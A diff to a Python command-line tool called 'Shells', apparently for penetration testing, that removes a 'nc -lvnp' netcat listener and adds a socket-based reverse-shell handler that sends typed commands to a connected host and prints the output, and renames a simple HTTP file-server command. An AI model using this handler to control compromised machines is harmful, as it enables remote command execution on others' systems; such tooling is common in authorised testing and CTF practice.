@@ -4,6 +4,7 @@ import subprocess
 import http.server
 import socketserver
 import socket
+import time
 
 
 class Shells(Cmd):
@@ -11,11 +12,35 @@ class Shells(Cmd):
     prompt = "[" + Fore.YELLOW + "shells" + Style.RESET_ALL + "] >>> "
 
     def do_listen(self, line):
-        PORT = line
-        subprocess.call('nc -lvnp {}'.format(PORT))
+        "Start a listener by running 'listen PORT'"
+        HOST = '0.0.0.0'
+        PORT = int(line)
 
-    def do_pythonws(self, line):
-        "Start a python HTTP web server by running 'pythonws PORT'"
+        server_socket = socket.socket(socket.AF_INET,
+                                      socket.SOCK_STREAM)  # create TCP socket
+        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
+                                 1)  # prevent timeout
+        server_socket.bind((HOST, PORT))
+        server_socket.listen(5)  # max 5 connections
+
+        client_socket, (
+            client_ip,
+            client_port) = server_socket.accept()  # accept connections
+
+        while True:
+            cmd = input("[rev-shell] > ")
+            client_socket.send(cmd.encode())
+
+            if (cmd == "quit"):
+                break
+
+            data = client_socket.recv(1024)
+            print(data)
+
+        client_socket.close()
+
+    def do_webserver(self, line):
+        "Start a python HTTP web server by running 'webserver PORT'"
         PORT = int(line)
 
         Handler = http.server.SimpleHTTPRequestHandler
